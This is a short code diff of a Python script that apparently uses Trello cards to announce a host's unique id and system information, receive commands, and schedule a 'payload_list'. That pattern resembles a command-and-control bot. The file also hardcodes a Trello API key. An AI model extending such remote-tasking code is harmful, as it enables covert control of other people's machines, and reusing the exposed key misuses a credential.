@@ -8,8 +8,8 @@ import socket
 from typing import List
 from enum import Enum
 from src.command import Command
-from src.runner import Runner
 from src.utils import card_from_list
+from src.schedular import Schedular
 # Nieuwe token aanvragen: https://trello.com/1/authorize?expiration=1day&scope=read,write&response_type=token&key=31ec916f741962caeb3b4d2ca1fd43b7
 
 api = "31ec916f741962caeb3b4d2ca1fd43b7"
@@ -42,7 +42,8 @@ def _get_unique_id() -> str:
 def main():
     unique_id = _get_unique_id()
     _update_or_announce(unique_id)
-    commands = _fetch_command(unique_id=unique_id)
+    commands = Command(command_list)
+    schedular = Schedular(unique_id, commands.get_commands(), payload_list)
 
 
 def _update_or_announce(unique_id) -> None:
@@ -83,11 +84,6 @@ def _system_info(unique_id: str) -> tuple[str, str]:
         f"{unique_id}",
         system_desc,
     )
-
-
-def _fetch_command(unique_id: str) -> Command:
-    command = Command(command_list)
-    return command
 
 
 def _update_status(card: Card, unique_id: str) -> None:
